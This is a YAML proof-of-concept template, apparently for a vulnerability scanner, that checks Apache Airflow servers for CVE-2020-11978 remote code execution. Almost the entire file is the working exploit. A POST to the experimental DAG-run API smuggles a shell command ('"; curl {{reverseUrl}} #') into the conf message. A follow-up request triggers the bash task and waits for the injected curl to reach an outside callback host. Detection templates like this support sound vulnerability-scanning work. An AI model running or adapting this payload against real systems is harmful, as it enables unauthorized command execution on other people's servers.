name: yaml-poc-apache-airflow-unauthorized_access-CVE-2020-11978
binding: 38954de0-51d7-4398-9c2c-15b8038f73e6
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/162908/Apache-Airflow-1.10.10-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/174764/Apache-Airflow-1.10.10-Remote-Code-Execution.html
        - https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E
        - https://nvd.nist.gov/vuln/detail/CVE-2020-11978
        - https://packetstormsecurity.com/files/162908/Apache-Airflow-1.10.10-Remote-Code-Execution.html
    vulnerability:
        id: b710e644-e82e-4c64-8fdf-a5a1c29493b6
        level: high
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseUrl: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/experimental/dags/example_trigger_target_dag/dag_runs
            headers:
                Content-Type: application/json
            body: '{"conf": {"message": "\"; curl {{reverseUrl}} #"}}'
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("execution_date") && response.content_type.contains("application/json")
        output:
            search: '"\"execution_date\":\"(?P<date>.*?)\",".submatch(response.body_string)'
            date: search["date"]
    r1:
        request:
            cache: true
            method: GET
            path: /api/experimental/dags/example_trigger_target_dag/dag_runs/{{date}}/tasks/bash_task
            follow_redirects: false
        expression: reverse.wait(15)
expression: r0() && r1()
